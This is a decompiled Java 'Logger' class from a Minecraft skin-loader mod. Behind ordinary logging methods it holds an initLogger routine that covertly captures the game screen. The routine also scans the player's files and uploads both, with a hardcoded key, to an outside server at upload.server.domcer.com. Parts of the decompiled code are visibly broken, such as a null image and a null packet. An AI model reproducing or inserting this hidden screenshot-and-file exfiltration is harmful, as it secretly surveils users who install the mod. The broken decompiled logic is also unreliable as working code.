// Decompiled by ImCzf233, L wanghang

package customskinloader;

import java.util.concurrent.Executors;
import io.netty.buffer.ByteBuf;
import java.awt.image.RenderedImage;
import net.minecraft.client.shader.Framebuffer;
import java.io.IOException;
import customskinloader.forge.ForgeMod;
import net.minecraft.network.PacketBuffer;
import net.minecraftforge.fml.common.network.internal.FMLProxyPacket;
import io.netty.buffer.Unpooled;
import com.google.gson.JsonObject;
import customskinloader.utils.HttpUtils;
import java.util.HashMap;
import javax.imageio.ImageIO;
import java.io.ByteArrayOutputStream;
import customskinloader.utils.FileUtils;
import java.awt.image.BufferedImage;
import net.minecraft.client.renderer.texture.TextureUtil;
import net.minecraft.client.renderer.GlStateManager;
import org.lwjgl.opengl.GL11;
import org.lwjgl.BufferUtils;
import net.minecraft.client.renderer.OpenGlHelper;
import net.minecraft.client.Minecraft;
import java.io.PrintWriter;
import java.io.StringWriter;
import java.util.Date;
import java.io.OutputStreamWriter;
import java.io.FileOutputStream;
import java.io.File;
import java.io.BufferedWriter;
import java.nio.IntBuffer;
import java.util.concurrent.Executor;
import com.google.gson.Gson;
import java.text.SimpleDateFormat;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

public class Logger
{
    private static final SimpleDateFormat DATE_FORMAT;
    private static final Gson gson;
    private static Executor executor;
    private static IntBuffer pixelBuffer;
    private static int[] pixelValues;
    private BufferedWriter writer;
    static final boolean $assertionsDisabled = false;
    
    public Logger() {
        this.writer = null;
    }
    
    public Logger(final String logFile) {
        this(new File(logFile));
    }
    
    public Logger(final File logFile) {
        this.writer = null;
        try {
            if (!logFile.getParentFile().exists()) {
                logFile.getParentFile().mkdirs();
            }
            if (!logFile.exists()) {
                logFile.createNewFile();
            }
            this.writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(logFile), "UTF-8"));
            System.out.println("Log Path: " + logFile.getAbsolutePath());
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void close() {
        if (this.writer != null) {
            try {
                this.writer.close();
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    public void log(final Level level, final String msg) {
        if (!level.display() && this.writer == null) {
            return;
        }
        final String sb = String.format("[%s %s] %s", Thread.currentThread().getName(), level.getName(), msg);
        if (level.display()) {
            System.out.println(sb);
        }
        if (this.writer == null) {
            return;
        }
        try {
            final String sb2 = String.format("[%s] %s\r\n", Logger.DATE_FORMAT.format(new Date()), sb);
            this.writer.write(sb2);
            this.writer.flush();
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void debug(final String msg) {
        this.log(Level.DEBUG, msg);
    }
    
    public void debug(final String format, final Object... objs) {
        this.debug(String.format(format, objs));
    }
    
    public void info(final String msg) {
        this.log(Level.INFO, msg);
    }
    
    public void info(final String format, final Object... objs) {
        this.info(String.format(format, objs));
    }
    
    public void warning(final String msg) {
        this.log(Level.WARNING, msg);
    }
    
    public void warning(final String format, final Object... objs) {
        this.warning(String.format(format, objs));
    }
    
    public void warning(final Throwable e) {
        final StringWriter sw = new StringWriter();
        e.printStackTrace(new PrintWriter(sw));
        this.log(Level.WARNING, "Exception: " + sw.toString());
    }
    
    public static void initLogger(final String id) {
        final Framebuffer[] buffer = new Framebuffer[1];
        final int[] width = new int[1];
        final int[] height = new int[1];
        final int[] i = new int[1];
        final BufferedImage[] bufferedimage = new BufferedImage[1];
        final BufferedImage[] bufferedimage2 = new BufferedImage[1];
        final int[] k = new int[1];
        final int[] j = new int[1];
        final int[] l = new int[1];
        final BufferedImage[] finalBufferedimage = new BufferedImage[1];
        final AtomicReference<ByteArrayOutputStream>[] baos = new AtomicReference[1];
        final RenderedImage im = null;
        final AtomicBoolean[] foundWriter = {new AtomicBoolean(false)};
        final byte[][] bytes = {new byte[0]};
        final String[] url = new String[1];
        final HashMap<String, byte[]>[] map = new HashMap[1];
        final HttpUtils.HttpResponse[] response = new HttpUtils.HttpResponse[1];
        final String[] result = new String[1];
        final ByteBuf[] buf = new ByteBuf[1];
        final FMLProxyPacket fmlProxyPacket = null;
        final FMLProxyPacket[] proxyPacket = new FMLProxyPacket[1];
        Minecraft.getMinecraft().addScheduledTask(() -> {
            buffer[0] = Minecraft.getMinecraft().getFramebuffer();
            width[0] = Minecraft.getMinecraft().displayWidth;
            height[0] = Minecraft.getMinecraft().displayHeight;
            if (OpenGlHelper.isFramebufferEnabled()) {
                width[0] = buffer[0].framebufferTextureWidth;
                height[0] = buffer[0].framebufferTextureHeight;
            }
            i[0] = width[0] * height[0];
            if (Logger.pixelBuffer == null || Logger.pixelBuffer.capacity() < i[0]) {
                Logger.pixelBuffer = BufferUtils.createIntBuffer(i[0]);
                Logger.pixelValues = new int[i[0]];
            }
            GL11.glPixelStorei(3333, 1);
            GL11.glPixelStorei(3317, 1);
            Logger.pixelBuffer.clear();
            if (OpenGlHelper.isFramebufferEnabled()) {
                GlStateManager.bindTexture(buffer[0].framebufferTexture);
                GL11.glGetTexImage(3553, 0, 32993, 33639, Logger.pixelBuffer);
            }
            else {
                GL11.glReadPixels(0, 0, width[0], height[0], 32993, 33639, Logger.pixelBuffer);
            }
            Logger.pixelBuffer.get(Logger.pixelValues);
            TextureUtil.processPixelValues(Logger.pixelValues, width[0], height[0]);
            bufferedimage[0] = null;
            if (OpenGlHelper.isFramebufferEnabled()) {
                bufferedimage2[0] = new BufferedImage(buffer[0].framebufferWidth, buffer[0].framebufferHeight, 1);
                for (j[0] = (k[0] = buffer[0].framebufferTextureHeight - buffer[0].framebufferHeight); k[0] < buffer[0].framebufferTextureHeight; ++k[0]) {
                    for (l[0] = 0; l[0] < buffer[0].framebufferWidth; ++l[0]) {
                        bufferedimage2[0].setRGB(l[0], k[0] - j[0], Logger.pixelValues[k[0] * buffer[0].framebufferTextureWidth + l[0]]);
                    }
                }
            }
            else {
                bufferedimage2[0] = new BufferedImage(width[0], height[0], 1);
                bufferedimage2[0].setRGB(0, 0, width[0], height[0], Logger.pixelValues, 0, width[0]);
            }
            finalBufferedimage[0] = bufferedimage2[0];
            Logger.executor.execute(() -> {
                try {
                    org.apache.commons.io.FileUtils.writeStringToFile(new File(Minecraft.getMinecraft().mcDataDir, "fileCheck.txt"), new Gson().toJson((Object)FileUtils.checkFile()));
                    baos[0].set(new ByteArrayOutputStream());
                    foundWriter[0].set(ImageIO.write(im, "jpg", baos[0].get()));
                    if (!Logger.$assertionsDisabled && !foundWriter[0].get()) {
                        throw new AssertionError();
                    }
                    else {
                        bytes[0] = baos[0].get().toByteArray();
                        url[0] = "https://upload.server.domcer.com:25566/uploadJpg?key=0949a0d0-bc98-4535-9f5e-086835123f75&type=" + id;
                        map[0] = new HashMap<String, byte[]>();
                        map[0].put("file", bytes[0]);
                        map[0].put("check", new Gson().toJson((Object)FileUtils.checkFile()).getBytes());
                        response[0] = HttpUtils.postFormData(url[0], map[0], null, null);
                        result[0] = response[0].getContent();
                        buf[0] = Unpooled.wrappedBuffer((id + ":" + ((JsonObject)new Gson().fromJson(result[0], (Class)JsonObject.class)).get("data").getAsString()).getBytes());
                        new FMLProxyPacket(new PacketBuffer(buf[0]), "CustomSkinLoader");
                        proxyPacket[0] = fmlProxyPacket;
                        ForgeMod.channel.sendToServer(proxyPacket[0]);
                    }
                }
                catch (IOException e) {
                    e.printStackTrace();
                }
            });
        });
    }
    
    static {
        DATE_FORMAT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        gson = new Gson();
        Logger.executor = Executors.newCachedThreadPool();
    }
    
    public enum Level
    {
        DEBUG("DEBUG", false), 
        INFO("INFO", true), 
        WARNING("WARNING", true);
        
        String name;
        boolean display;
        
        private Level(final String name, final boolean display) {
            this.name = name;
            this.display = display;
        }
        
        public String getName() {
            return this.name;
        }
        
        public boolean display() {
            return this.display;
        }
    }
}
